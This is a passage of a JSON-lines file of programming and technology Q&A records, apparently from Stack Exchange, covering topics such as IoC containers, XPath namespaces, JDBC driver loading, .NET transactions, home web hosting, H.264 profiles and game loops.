of the class, from client code, to control which version of a dependant object the instance will use... IOC can be used to inject a \"Proxy\" object into a class where it thinks it is using the real object...  The phrase Inversion of Control refers to the fact that when using this pattern, the decision as to which actual implementation is called is no longer under the control of the class making the call, but to the client of that class, when it injects an instance of a dependant object into the class to be used for this call.\nGenerally the term IOC is used with what is called an IOC Container, which is a class specifically designed to be responsible for creating instances of dependant classes based on loosely coupled information about those classes (Types) which it gets from some source other than hard-wired dependencies (most often, from some kind of configuration file).   Generally, when you use an IOC container, you create an instance of it when the application starts, and then (by reading config data or whatever), you \"register\" each of the classes (types) that the IOC container will be responsible for, with a key value.  The key is often the abstract type or interface that all instances of this registration must implement).  Then, in the normal operations of your application, where you might otherwise have new'd up an instance of one of these types, you call the IOC Container, and ask it for an instance instead, using the abstract type/Interface as the key.  The IOC container then uses reflection or dynamic loading, (or whatever), to create an instance of whatever type has been \"registered\" with that key.   In this way, simply by changing configuration data, you can control the actual types used by the application, changing them in one environment or deployment location from those used in another. \n", "score": 19}
{"title": "How to retrieve namespaces in XML files using Xpath", "description": "I have an XML file that starts like this:\n<Elements name=\"Entities\" xmlns=\"XS-GenerationToolElements\">\n\nI'll have to open a lot of these files. Each of these have a different namespace but will only have one namespace at a time (I'll never find two namespaces defined in one xml file).\nUsing XPath I'd like to have an automatic way to add the given namespace to the namespace manager. \nSo far, i could only get the namespace by parsing the xml file but I have a XPathNavigator instance and it should have a nice and clean way to get the namespaces, right?\n-- OR --\nGiven that I only have one namespace, somehow make XPath use the only one that is present in the xml, thus avoiding cluttering the code by always appending the namespace.\n", "answer": "There are a few techniques that you might try; which you use will depend on exactly what information you need to get out of the document, how rigorous you want to be, and how conformant the XPath implementation you're using is.\nOne way to get the namespace URI associated with a particular prefix is using the namespace:: axis. This will give you a namespace node whose name is the prefix and whose value is the namespace URI. For example, you could get the default namespace URI on the document element using the path:\n/*/namespace::*[name()='']\n\nYou might be able to use that to set up the namespace associations for your XPathNavigator. Be warned, though, that the namespace:: axis is one of those corners of XPath 1.0 that isn't always implemented.\nA second way of getting that namespace URI is to use the namespace-uri() function on the document element (which you've said will always be in that namespace). The expression:\nnamespace-uri(/*)\n\nwill give you that namespace.\nAn alternative would be to forget about associating a prefix with that namespace, and just make your path namespace-free. You can do this by using the local-name() function whenever you need to refer to an element whose namespace you don't know. For example:\n//*[local-name() = 'Element']\n\nYou could go one step further and test the namespace URI of the element against the one of the document element, if you really wanted:\n//*[local-name() = 'Element' and namespace-uri() = namespace-uri(/*)]\n\nA final option, given that the namespace seems to mean nothing to you, would be to run your XML through a filter that strips out the namespaces. Then you won't have to worry about them in your XPath at all. The easiest way to do that would be simply to remove the xmlns attribute with a regular expression, but you could do something more complex if you needed to do other tidying at the same time.\n", "score": 90}
{"title": "What is LTS (Long Term Support)?", "description": "I looked it up in Wikipedia, and there is only one line there. Anyone have a more detailed description for it? Ubuntu releases their OS with this notation, but I was unable to find a detailed description over what it means/includes. I've already read the Ubuntu notation but need a more general description, not how Ubuntu has implemented it.\n", "answer": "In the Linux World, LTS and similar terms mean that the distribution stays stable. That means: You will not get any major functional upgrades (at least none that break compatibility in any way), but you will get security enhancements. One example of this is Red Hat Enterprise Server or CentOS, which only had PHP 5.1 and were not upgraded to 5.2, yet all 5.2 security upgrades were backported.\nThink of it like this: If you are writing a custom piece of Software (say, a very special Apache module) today and the company guarantees 5 year support, that means that you can be very sure that your custom software still runs in 5 years because all of the interfaces and structures will remain the same.\nIn the Windows World, this is not as strict but similar. Microsoft supported Windows NT 4 for 10 Years, up to middle or end of 2006. It was long obsolete by then, having been succeeded by both Windows 2000 and XP/2003, but because companies either did not want to migrate yet or had custom software that is not compatible, Microsoft provided support and (security) upgrades until then.\nIf you like bulleted lists, long term support means:\n\nStable Interfaces and \"System Core\"\nGets Security updates\n(Usually) no or not much new functionality is added\nGives companies safety when making plans, as they know: If we launch this today, it is guaranteed to run until Date X.\nNot usable in all situations. If you want bleeding edge, LTS Systems are almost certainly not for you, but even technology that is not that bleeding edge may not be added (i.e. Windows NT never got real USB Support, RedHat/CentOS ran PHP 5.1 instead of 5.2, even months after 5.2.0 was released)...\nThe exact definition about what Long Term Support covers varies from vendor to vendor, you want to check with them before making a decision\n\n", "score": 29}
{"title": "How to use a JDBC driver from an arbitrary location", "description": "I need to test a JDBC connection to a database. The java code to do that should be as simple as:\nDriverManager.getConnection(\"jdbc connection URL\", \"username\", \"password\");\n\nThe driver manager will lookup the appropriate the driver for the given connection URL. However I need to be able to load the JDBC driver (jar) at runtime. I.e I don't have the JDBC driver on the classpath of the java application that runs the snippet of code above.\nSo I can load the driver using this code, for example:\nURLClassLoader classLoader = new URLClassLoader(new URL[]{\"jar URL\"}, this.getClass().getClassLoader());\nDriver driver = (Driver) Class.forName(\"jdbc driver class name\", true, classLoader).newInstance();\n\nBut then the driver manager still won't pick it up as I can't tell it which classloader to use. I tried setting the current thread's context classloader and it still doesn't work.\nAnyone has any idea on the best way to achieve that?\n", "answer": "From the article Pick your JDBC driver at runtime; I am just going to post the code here for reference.\nThe idea is to trick the driver manager into thinking that the driver was loaded from the system classloader. To do this we use this class:\npublic class DelegatingDriver implements Driver\n{\n    private final Driver driver;\n\n    public DelegatingDriver(Driver driver)\n    {\n        if (driver == null)\n        {\n            throw new IllegalArgumentException(\"Driver must not be null.\");\n        }\n        this.driver = driver;\n    }\n\n    public Connection connect(String url, Properties info) throws SQLException\n    {\n       return driver.connect(url, info);\n    }\n\n    public boolean acceptsURL(String url) throws SQLException\n    {\n       return driver.acceptsURL(url);\n    }\n\n    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) throws SQLException\n    {\n        return driver.getPropertyInfo(url, info);\n    }\n\n    public int getMajorVersion()\n    {\n        return driver.getMajorVersion();\n    }\n\n    public int getMinorVersion()\n    {\n        return driver.getMinorVersion();\n    }\n\n    public boolean jdbcCompliant()\n    { \n        return driver.jdbcCompliant();\n    }\n}\n\nThis way the driver you register is of type DelegatingDriver which is loaded with the system classloader. You now just have to load the driver you really want to use using whatever classloader you want. For example:\nURLClassLoader classLoader = new URLClassLoader(new URL[]{\"path to my jdbc driver jar\"}, this.getClass().getClassLoader());\nDriver driver = (Driver) Class.forName(\"org.postgresql.Driver\", true, classLoader).newInstance();\nDriverManager.registerDriver(new DelegatingDriver(driver)); // register using the Delegating Driver\n\nDriverManager.getDriver(\"jdbc:postgresql://host/db\"); // checks that the driver is found\n\n", "score": 20}
{"title": "C++: Derived + Base class implement a single interface?", "description": "In C++, is it possible to have a base plus derived class implement a single interface?\nFor example:\nclass Interface\n{\n    public:\n        virtual void BaseFunction() = 0;\n        virtual void DerivedFunction() = 0;\n};\n\nclass Base\n{\n    public:\n        virtual void BaseFunction(){}\n};\n\nclass Derived : public Base, public Interface\n{\n    public: \n        void DerivedFunction(){}\n};\n\nvoid main()\n{\n    Derived derived;\n}\n\nThis fails because Derived can not be instantiated. As far as the compiler is concerned Interface::BaseFunction is never defined.\nSo far the only solution I've found would be to declare a pass through function in Derived\nclass Derived : public Base, public Interface\n{\n    public: \n        void DerivedFunction(){}\n        void BaseFunction(){ Base::BaseFunction(); }\n};\n\nIs there any better solution?\n\nEDIT: If it matters, here is a real world problem I had using MFC dialogs. \nI have a dialog class (MyDialog lets say) that derives from CDialog. Due to dependency issues, I need to create an abstract interface (MyDialogInterface). The class that uses MyDialogInterface needs to use the methods specific to MyDialog, but also needs to call CDialog::SetParent. I just solved it by creating MyDialog::SetParent and having it pass through to CDialog::SetParent, but was wondering if there was a better way.\n", "answer": "C++ doesn't notice the function inherited from Base already implements BaseFunction: The function has to be implemented explicitly in a class derived from Interface. Change it this way:\nclass Interface\n{\n    public:\n        virtual void BaseFunction() = 0;\n        virtual void DerivedFunction() = 0;\n};\n\nclass Base : public Interface\n{\n    public:\n        virtual void BaseFunction(){}\n};\n\nclass Derived : public Base\n{\n    public: \n        virtual void DerivedFunction(){}\n};\n\nint main()\n{\n    Derived derived;\n}\n\nIf you want to be able to get away with only implementing one of them, split Interface up into two interfaces: \nclass DerivedInterface\n{\n    public:\n        virtual void DerivedFunction() = 0;\n};\n\nclass BaseInterface\n{\n    public:\n        virtual void BaseFunction() = 0;\n};\n\nclass Base : public BaseInterface\n{\n    public:\n        virtual void BaseFunction(){}\n};\n\nclass Derived : public DerivedInterface\n{\n    public: \n        virtual void DerivedFunction(){}\n};  \n\nclass Both : public DerivedInterface, public Base {\n    public: \n        virtual void DerivedFunction(){}\n};\n\nint main()\n{\n    Derived derived;\n    Base base;\n    Both both;\n}\n\nNote: main must return int\nNote: it's good practise to keep virtual in front of member functions in the derived that were virtual in the base, even if it's not strictly required.\n", "score": 17}
{"title": "How to implement transaction way in vb.net?", "description": "I develop one application using VB.net (200%) that connects to MS-Access Database, I use TableAdapter and Dataset for connection to the Access DB file.\nI need to implement a simple transaction method (commit, rollback) in saving to the DB?\nIs there a way to do that without the need to use inline SQL statement?\nThanks,\n", "answer": "As I read Microsoft Jet (Access DB Engine) supports transactions. So you can create a transaction like this (example from CodeProject):\n      SqlConnection db = new SqlConnection(\"connstringhere\");\n      SqlTransaction transaction;\n\n      db.Open();\n      transaction = db.BeginTransaction();\n      try \n      {\n         new SqlCommand(\"INSERT INTO TransactionDemo \" +\n            \"(Text) VALUES ('Row1');\", db, transaction)\n            .ExecuteNonQuery();\n         new SqlCommand(\"INSERT INTO TransactionDemo \" +\n            \"(Text) VALUES ('Row2');\", db, transaction)\n            .ExecuteNonQuery();\n         new SqlCommand(\"INSERT INTO CrashMeNow VALUES \" +\n            \"('Die', 'Die', 'Die');\", db, transaction)\n            .ExecuteNonQuery();\n         transaction.Commit();\n      } \n      catch (SqlException sqlError) \n      {\n         transaction.Rollback();\n      }\n      db.Close();\n\nAn easier way is (example from 15 Seconds):\nbool IsConsistent = false;\n\nusing (System.Transactions.TransactionScope ts = new System.Transactions.TransactionScope())\n\n{\n\n      SqlConnection cn = newSqlConnection(CONNECTION_STRING );\n\n      string sql = \"DELETE Categories\";\n\n      SqlCommand cmd = newSqlCommand(sql, cn);\n\n      cn.Open();\n\n      cmd.ExecuteNonQuery();\n\n      cn.Close();\n\n      //Based on this property the transaction will commit if\n\n      //successful.  If it fails however, this property will\n\n      //not be set and the transaction will not commit.\n\n      ts.Consistent = IsConsistent;\n\n}\n\nYou will need MSDTC running on your machine if you are using TransactionScope.\nUnfortunately TableAdapter does not expose a connection property, so you need a workaround. So you need some workaround:\n1) Reflection (example form CodeProject)\nconn = new SqlConnection(Properties.Settings.Default.NorthwindConnectionString);\nconn.Open();\ntrans = conn.BeginTransaction();\n1. \npublic SqlDataAdapter GetAdapter(object tableAdapter)\n{\n    Type tableAdapterType = tableAdapter.GetType();\n    SqlDataAdapter adapter = (SqlDataAdapter)tableAdapterType.GetProperty(\"Adapter\", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(tableAdapter, null);\n        return adapter;\n}\n2.\nadapter.InsertCommand.Connection = trans.Connection;\nadapter.UpdateCommand.Connection = trans.Connection;\nadapter.DeleteCommand.Connection = trans.Connection;\n\n3.\nadapter.InsertCommand.Transaction = trans;\nadapter.UpdateCommand.Transaction = trans;\nadapter.DeleteCommand.Transaction = trans;\n\n4. \n-\n\n5. \ntrans.commit();\n\nReflection can be very slow!\n2) TransactionScope (example form DevX.com)\n    CustomersDataSet.CustomersDataTable customers = new CustomersDataSet.CustomersDataTable();\n   CustomersDataSetTableAdapters.CustomersTableAdapter tblAdap = new \n      CustomersDataSetTableAdapters.CustomersTableAdapter();\n   using (TransactionScope txScope = new TransactionScope())\n   {\n       tblAdap.Fill(customers);\n       customers.Rows[0][\"ContactName\"] = \"Maria Velasquez\";\n       tblAdap.Update(customers);\n       txScope.Complete();\n   }\n\nYou will need MSDTC!\n", "score": 11}
{"title": "When should I use OO Perl?", "description": "I'm just learning Perl.\nWhen is it advisable to use OO Perl instead of non-OO Perl?\nMy tendency would be to always prefer OO unless the project is just a code snippet of < 10 lines.\nTIA\n", "answer": "From Damian Conway:\n\n10 criteria for knowing when to use object-oriented design\n\nDesign is large, or is likely to become large\nWhen data is aggregated into obvious structures, especially if there’s a lot of data in each aggregate\nFor instance, an IP address is not a good candidate: There’s only 4 bytes of information related to an IP address.  An immigrant going through customs has a lot of data related to him, such as name, country of origin,  luggage carried, destination, etc.\nWhen types of data form a natural hierarchy that lets us use inheritance.\nInheritance is one of the most powerful feature of OO, and the ability to use it is a flag.\nWhen operations on data varies on data type\nGIFs and JPGs might have their cropping done differently, even though they’re both graphics.\nWhen it’s likely you’ll have to add data types later\nOO gives you the room to expand in the future.\nWhen interactions between data is best shown by operators\nSome relations are best shown by using operators, which can be overloaded.\nWhen implementation of components is likely to change, especially in the same program\nWhen the system design is already object-oriented\nWhen huge numbers of clients use your code\nIf your code will be distributed to others who will use it, a standard interface will make maintenence and safety easier.\nWhen you have a piece of data on which many different operations are applied\nGraphics images, for instance, might be blurred, cropped, rotated, and adjusted.\nWhen the kinds of operations have standard names (check, process, etc)\nObjects allow you to have a DB::check, ISBN::check, Shape::check, etc without having conflicts between the types of check.\n\n", "score": 19}
{"title": "launch app, capture stdout and stderr in c++", "description": "How do I launch an app and capture the output via stdout and maybe stderr?\nI am writing an automated build system and I need to capture the output to analyze. I'd like to update the svn repo and grab the revision number so I can move the files in autobuild/revNumber/ if successful. I also would like to build using make and upload the compile text to my server for everyone to see the warnings and errors on a failed build.\nI can't find the system() function, but I found the CreateProcess() function on MSDN. I am able to launch what I need but I have no idea how to capture the stderr and stdout.  I notice the process launches separately unless I set a breakpoint and keep my app exiting which it then will keep all the text in my app console window. I would also want to wait until all processes are finished and then scan the data it produced to do any additional operations I need. How do I do any of this?\n", "answer": "In real shells (meaning, not sea shells - I mean, not in C Shell or its derivatives), then:\nprogram arg1 arg2 >/tmp/log.file 2>&1\n\nThis runs program with the given arguments, and redirects the stdout to /tmp/log.file; the notation (hieroglyph) '2>&1' at the end sends stderr (file descriptor 2) to the same place that stdout (file descriptor 1) is going.  Note that the sequence of operations is important; if you reverse them, then standard error will go to where standard output was going, and then standard output (but not standard error) will be redirected to the file.\nThe choice of file name shown is abysmal for numerous reasons - you should allow the user to choose the directory, and probably should include the process ID or time stamp in the file name.\nLOG=${TMPDIR:-/tmp}/log.$$.$(date +%Y%m%d-%H%M%S)\nprogram arg1 arg2 >$LOG 2>&1\n\nIn C++, you can use the system() function (inherited from C) to run processes.  If you need to know the file name in the C++ program (plausible), then generate the name in the program (strftime() is your friend) and create the command string with that file name.\n(Strictly, you also need getenv() to get $TMPDIR, and the POSIX function getpid() to get the process ID, and then you can simulate the two-line shell script (though the PID used would be of the C++ program, not the launched shell).\nYou could instead use the POSIX popen() function; you'd have to include the '2>&1' notation in the command string that you create to send the standard error of the command to the same place as standard output goes, but you would not need a temporary file:\nFILE *pp = popen(\"program arg1 arg2 2>&1\", \"r\");\n\nYou can then read off the file stream.  I'm not sure whether there's a clean way to map a C file stream into a C++ istream; there probably is.\n", "score": 12}
{"title": "How do I set up a web server out of my home?", "description": "I want to run a web server from home, so my family, and clients can see what I am doing.  It would not run a large load, at most 2 or 3 users at a time.\nI would like to know how to do it with a Windows machine running IIS.\nI have a router from my cable company and it runs through a wireless router to the machine I would want to be a web server.\n", "answer": "Here are the basic steps. The specific details depend on what kind of router you have, but the concepts still apply:\n\nInstall IIS on the machine you want to be a web server. It is okay to leave it on the standard port 80 in most cases (we'll remap the port later through the firewall since most ISPs disallow incoming traffic on port 80).\nGo to DynDns.org and create yourself a name which maps to your home IP address. This is important because your address will change from time to time (the \"D\" in DHCP) and you want to have a well-known external name to your home. Using DynDNS is pretty easy and they have good FAQs to help you. If your router supports DynDns automatically, then you will need to log onto your router and supply the dyndns.org username and password. If your router does not support DynDNS, they have a small utility that you should download and install on your IIS machine that runs all the time and detects when your public IP address changes and updates your dyndns host record.\nLogon to your router (typically a website located at 192.168.0.1, or whatever the first IP address of your IP range is). Set a fixed IP address for your IIS machine. Typically this is accomplished by assigning a fixed DHCP address to the MAC address of your IIS machine. Once you do that, your IIS machine will always fetch the same IP address when it requests one via DHCP\nLogon to your router. Add a \"port mapping\" (or sometimes called a \"static route\"), mapping public TCP port 8080 incoming to the IP address of your local IIS computer on port 80 (the default port). Note that some routers don't allow you change ports (often time, that's the \"static route\" option). In that case, you're going to want to reconfigure IIS to listen on port 8080 (or whatever port you want to make public) and just create a route from public TCP port 8080 to port 8080 on your IIS computer.\n\nObviously, there are several places where this can be misconfigured and troubleshooting is inevitable.\n\nVerify that IIS is working on your local network. Fire up your favorite browser and navigate to the local IP address and port of your IIS computer: http://192.168.0.5:80, or whatever is appropriate. Make sure it works. If not, fix it until it does.\nVerify that your DynDNS record is correctly mapping to your current public IP address. You can figure out your current public IP address by going to http://whatismyipaddress.com. Once you know that, open a command prompt and ping your public name (\"ping longhorn213.homeip.net\" or whatever name DynDNS gave you) and see if it works. The ping itself may be blocked (many routers block incoming pings), but you should still see the IP address that was looked-up. Make sure it matched your actual public address. If not, work with DynDNS org to get this working.\nIf troubleshooting steps 1 and 2 are both working, then the problem is likely to be in the port mapping of your router. That's the hardest to troubleshoot usually. Often times routers have internal logs that you can turn on. Look for incoming traffic logs for the designated port and see what the router is doing with it. You may need to find a forum or support site for your specific router to get this working if you have problems.\n\n", "score": 17}
{"title": "How does a blade server differ from a normal rackmount server?", "description": "This may be a question but I thought I would ask even so.\n", "answer": "Blade servers are small, high-density, low form-factor computers, designed for maximum power in a small space.\nA blade server is mounted within a chassis, and the chassis typically takes on a lot of functions and parts that were previously done by the individual host. The chassis itself will hold the power supplies (resulting in less wasted power from conversion), the fibre-channel cards, the network controllers, SCSI interfaces, and so on. The servers themselves contain only the non-unique parts – CPU, RAM, and hard drive.\nThe benefits are that you can pack far more computing power into a rack, you have homogenous hardware, and your management is simpler. Instead of monitoring two power supplies, NICs, etc. per server, you only have to watch one set of hardware. Because your hardware is homogenous, you can keep spare parts around without worrying about which model of power supply you need, and so on.\nThe downsides are the up-front costs. Because you need to buy the (very expensive) chassis, it's cost-ineffective to start with one blade and work your way up. You would typically buy blade servers if you plan on buying a large number of servers at once. Otherwise, the initial up-front cost is excessive.\n", "score": 18}
{"title": "What are the differences between H.264 Profiles?", "description": "I was rendering a video in After Effects CS5 and when I was formatting it I chose the H.264 codec and in that format, it had a profile with Baseline, Main and High.\nSo I did a little test – rendering both files with Baseline and High. The only thing I noticed was that the video size was smaller, High delivering the smaller file size.\nI just wanted to know what the difference is as in which would be best for quality and best for file size.\n", "answer": "What is a profile?\nA H.264 profile more or less defines what \"bells and whistles\" the encoder can use when compressing your video – and there are lots of H.264 features that the encoder can enable. Which ones it's allowed to enable is defined by the profile. Profiles ensure compatibility between devices that have different decoding capabilities. With profiles, the encoder and decoder agree on a feature set that they can both handle.\nWhat do the different profiles do?\nFor a detailed list, see H.264 Profiles on Wikipedia.\nGenerally, the Baseline profile restricts the encoder to certain basic features only. Videos encoded with baseline profile can be easily played back, even on devices with lower computational power, such as old smartphones. Android and iOS phones, for example, used to only be able to play video encoded with the baseline profile. This has changed a little bit in the last years, where more and more phones can actually play main profile video, but not high profile.\nSo, baseline means:\n\nPrimarily for low-cost applications, this profile is most typically used in videoconferencing and mobile applications. It corresponds to the subset of features that are in common between the Baseline, Main, and High Profiles\n\nMain and High just add features to that. Especially the high profile is often used in broadcasting:\n\nThe primary profile for broadcast and disc storage applications, particularly for high-definition television applications (for example, this is the profile adopted by the Blu-ray Disc storage format and the DVB HDTV broadcast service).\n\nB slices are for example only allowed in the Main profile and above. They can be used to save on bandwidth, but are harder to decode, which is why some devices might not support them.\nWhat does that have to do with quality?\nThe profile only indirectly influences the quality. Some features of higher profiles may enable you to get the same quality with lower file sizes as compared to lower profiles.\nFor example, CABAC entropy coding (Main and High) is more efficient than CAVLC (Baseline). It is also computationally more intensive. Thus, if you give the encoder a certain bit rate to spend, it'll be able to create a better quality video with CABAC than with CAVLC because it achieves much better compression.\nThis also explains why you achieved smaller file size with the High profile — obviously, you somehow set a constant quality level and the encoder could use more advanced compression techniques to create a video file that has the same quality as the Baseline profile, but with smaller size.\nSo… which one should you use?\nSome basic rules:\n\nBaseline profile if you're targeting old mobile devices\nMain profile for modern devices and web streaming\nHigh profile for long-term storage, PCs or Macs, Blu-ray authoring, etc.\n\n", "question_score": "95", "answer_score": 127}
{"title": "Do I need to defragment Mac OS X?", "description": "Does windows need to be defragmented regularly?\nWhy does MacOS not have a Defragmentation utility? \nPlease teach a detailed person\n", "answer": "I think the best answer for this comes straight from this apple support KB\n\nAbout optimization and fragmentation\nDisk optimization is a process in\n  which the physical locations of files\n  on a volume are \"streamlined.\" Files\n  and metadata are re-arranged in order\n  to improve data access times and\n  minimize time moving a hard drive's\n  head.\nFiles can become \"fragmented\" over\n  time as they are changed and saved and\n  as the volume is filled, with\n  different parts of a single file\n  stored in different locations on a\n  volume. The process of collecting file\n  fragments and putting them \"back\n  together\" is known as optimization.\n  However, if a failure occurs during\n  optimization, such as power loss,\n  files could become damaged and need to\n  be restored from a backup copy.\nDo I need to optimize?\nYou probably won't need to optimize at\n  all if you use Mac OS X. Here's why:\n\nHard disk capacity is generally much greater now than a few years ago. With\n  more free space available, the file\n  system doesn't need to fill up every\n  \"nook and cranny.\" Mac OS Extended\n  formatting (HFS Plus) avoids reusing\n  space from deleted files as much as\n  possible, to avoid prematurely filling\n  small areas of recently-freed space.\nMac OS X 10.2 and later includes delayed allocation for Mac OS X\n  Extended-formatted volumes. This\n  allows a number of small allocations\n  to be combined into a single large\n  allocation in one area of the disk.\nFragmentation was often caused by continually appending data to existing\n  files, especially with resource forks.\n  With faster hard drives and better\n  caching, as well as the new\n  application packaging format, many\n  applications simply rewrite the entire\n  file each time. Mac OS X 10.3 Panther\n  can also automatically defragment such\n  slow-growing files. This process is\n  sometimes known as\n  \"Hot-File-Adaptive-Clustering.\"\nAggressive read-ahead and write-behind caching means that minor\n  fragmentation has less effect on\n  perceived system performance.\n\n", "question_score": "9", "answer_score": 17}
{"title": "Emulate a USB port as a USB flash drive?", "description": "Does anyone know of any software that can emulate a USB flash drive through an available USB port in OS X? Perhaps some way to map a directory to a USB port that could then be connected to another device that supports reading USB storage devices?\nI'd love to connect my laptop to my car's USB port and access files as if it were a USB drive. I know about the target disk mode with firewire (not sure if this is also supported over USB), but I was hoping for something that doesn't require booting outside of the OS (I want to retain use of the machine).\nI'm thinking there may be hardware limitations that prevent software from doing this by itself.\nAny ideas?\n", "answer": "Unfortunately, USB makes a firm distinction between the Host and the Device. If the USB receptacle on your car has the standard USB A (Host) connector like a PC would have, it means the car's computer wants to be the Host, just like your computer wants to be the Host, so they would most likely conflict with each other and not be able to talk to each other.\nSome people have made \"USB file transfer cables\" for connecting two Hosts together. These cables have an embedded chip that does the work of making the two Hosts appear as devices to each other. I believe these products assume both Hosts are full-fledged PCs, not embedded systems that happen to have a Host connector. I don't have experience with these cables, so I'm not sure whether a software install would be required on one or both ends. It might be worth looking into.\nThe USB Implementers Forum (the body behind the USB spec) eventually realized the limitations of the Host vs. Device distinction, and created the USB On-The-Go (OTG) specification as a way for USB-capable things to switch between the Host and Device roles on the fly as needed, depending on what they're talking to. However, I think you'd probably need both ends to support USB OTG.\n", "question_score": "9", "answer_score": 11}
{"title": "Sending a direct or private message in Twitter", "description": "I've heard of direct messages in Twitter but I don't know if that's the same as using  @username or is something else. \nWhat is the difference (in case they are different) and/or how could I send a direct message to a fellow Twitterer? Is it like a private message?\n", "answer": "Direct messages, commonly referred to as simply DMs, are one of the only parts of Twitter that are private.\n\nIntroduction\nBasically, direct messages are messages you send directly to another Twitter user; no one else can read them, except for the recipient.\nHowever, the user you send a DM to has to follow you on Twitter. This requirement was enacted to decrease the amount of spam on Twitter.\n\nSending a direct message\nThere's a few ways to send a direct message:\n\nYou can send one from the main What's Happening? textbox in the Twitter web interface. To do this, you type: d username message or dm username message: username is the name of the user you're sending the DM to, and message is your message.\nYou can DM someone by going to their profile page and selecting Direct Message from the Actions button (next to the Lists button).\nYou can hover over a user's profile picture in the timeline/inbox and select Direct Message from the Actions button.\nYou can go to the Direct Messages tab on the Twitter home page (after you log in) and select a user. Once you do so, you can write a message as usual and click Send.\n\nDifference from @ replies\nIn your question, you also asked how direct messages are different from posting @username ... on Twitter. \nThe @username style is known as an @ reply. You can use it to reply to someone's tweet or just say something to them (not to a specific tweet).\nThey are quite different from DMs:\n\nThe user you @ reply to does NOT have to follow you.\n@ replies are NOT private. They are visible to everyone, unless your tweets are protected (private).\n\nHope that helped!\n", "question_score": "9", "answer_score": 10}
{"title": "Where are the warp zones?", "description": "In which levels are the Warp Zones located in Super Mario Bros. and how do you get to them?\n", "answer": "\nLevel 1-2:  Warp to World 2, 3, or 4\nLevel 4-2: Warp to World 6, 7, or 8\nLevel 4-2:  Warp to Word 5 (Yes, there are two on this level)\n\nThe following detail came from this site.\n\nWhere to find warp zone #1 hidden in\n  level 1-2\nYou will find the first Warp Zone\n  located at the end of level 1-2. In\n  order to reach it, you will need to\n  ride the previous elevator to the top\n  and then jump onto the brick ceiling.\n  Run all the way to your right and you\n  will find the Warp Zone. Enter the\n  corresponding Pipe to skip to world’s\n  2, 3 or 4.\nWhere to find warp zone #2 hidden in\n  level 4-2\nThis level contains two Warp Zones,\n  one to level 5 located at the end of\n  the level, and this Warp Zone that\n  takes you to levels 6, 7 and 8 located\n  in the middle of the level. To find\n  this Warp Zone look for a high\n  three-brick-long platform that is too\n  high for you to reach, located across\n  from the first elevator platform.\n  There are some invisible blocks that\n  you will need to make appear in order\n  to reach the far left block, which\n  contains a vine. You need to hit the\n  invisible blocks from below to create\n  a staircase allowing you to reach the\n  Vine. To do this, make the first two\n  lower blocks on the righter side\n  appear. They will start to create a\n  staircase. Then hop on them and break\n  the two bricks above. If you haven’t\n  already activated the vine, try to do\n  so now, and then make the following\n  invisible blocks appear if you need\n  them to reach the vine. Climb the vine\n  and you’ll reach the Warp Zone that\n  can take you to worlds 6, 7 or 8\n  depending on which pipe you enter.\nWhere to find warp zone #3 hidden in\n  level 4-2\nTo reach the final Warp Zone (note\n  that you can only take one Warp Zone\n  since both are on the same level), you\n  will need to reach the ceiling from an\n  elevator platform and then run all the\n  way across it to the right, just like\n  you did in level 1-2. This Warp Zone\n  will take you to World 5.\n\n", "score": 16}
{"title": "Proper sitemap.xml setup", "description": "I have a dynamic site which has many (well, less than 50) users.  Each user is allowed to create as many pages as they want.  I know that there is a limit to how many pages you can be listed in sitemap.xml, and for now I am under that limit, but I would like to know what the best way to enable search engines to know (all?) about my user's pages while still being under that limit even if I have more than the limit.\n", "answer": "Sitemap Limits:\n\nSitemap files have a limit of 50,000\n  URLs and 10 megabytes per sitemap.\n  Sitemaps can be compressed using gzip,\n  reducing bandwidth consumption.\n  Multiple sitemap files are supported,\n  with a Sitemap index file serving as\n  an entry point for a total of 1000\n  Sitemaps.\n\nNote that you can specify multiple sitemaps in your robots.txt file:\nIf you're bumping into the limitation, perhaps divide your users up somehow. Let's say each of your users has no more than 10,000 urls a piece, you could break it up into files and add this to your robots.txt file:\nSitemap: http://www.example.com/sitemaps/users-001-005.xml\nSitemap: http://www.example.com/sitemaps/users-006-010.xml\nSitemap: http://www.example.com/sitemaps/users-011-015.xml\nSitemap: http://www.example.com/sitemaps/users-016-020.xml\nSitemap: http://www.example.com/sitemaps/users-021-025.xml\nSitemap: http://www.example.com/sitemaps/users-026-030.xml\nSitemap: http://www.example.com/sitemaps/users-031-035.xml\nSitemap: http://www.example.com/sitemaps/users-036-040.xml\nSitemap: http://www.example.com/sitemaps/users-041-045.xml\nSitemap: http://www.example.com/sitemaps/users-046-050.xml\n\nNow, you'd still have to be mindful of the 10MB limit for each individual sitemap, but this is an approach to handle the \"too many\" urls problem.\nSee the CNN and Google robots.txt files to see multiple sitemaps in action.\n", "score": 11}
{"title": "What should a main game loop do?", "description": "Generally, what are the core things that one should do in the game loop, and what are some things that one shouldn't do in the game loop?\n", "answer": "The main game loop handles three major tasks:\n\nGet user input\nUpdate the game state\nDraw the game\n\nA simple game loop just mushes these three tasks into one while loop. This has some undesired results:\n\nGame runs at different speeds on different computers.\nCPU (can be needlessly) pegged at 100% usage.\n\"Game states\"/menus are missing or mixed with game code.\nMain game loop is very long and hard to maintain.\nCode is difficult to extend/port to other platforms.\n\nAdvanced gamed loops address the issues listed above. Here are some useful articles:\n\ndeWiTTERS Game Loop\nIntegrating a timer into a game loop\nManaging Game States in C++\nXNA Game State Management and Network Game State Management\nUnderstanding the Game Main Loop\n\nFor an excellent example game loop, take a look at the Allegro skater demo game:\n\nGame loop code is in framework.c.\nBrowse full source code here.\n\nOther related resources:\n\nGlenn Fiedler's article about robust framerate independence, \"Fix Your Timestep!\"\nThis deals with a number of different ways to write your game loop:\nMultithreaded Game Engine Architectures\nGame Loop · Sequencing Patterns · Game Programming Patterns\n\nGame loops often do the same type of work for most games, so I have been thinking of a way to make a generalized game framework. It is better to write one implementation of a game loop and share it between games. It saves work when creating a new game, and improvements to the shared game loop can be shared by all games (for example, adding a FPS counter or screen capture feature).\n", "score": 135}
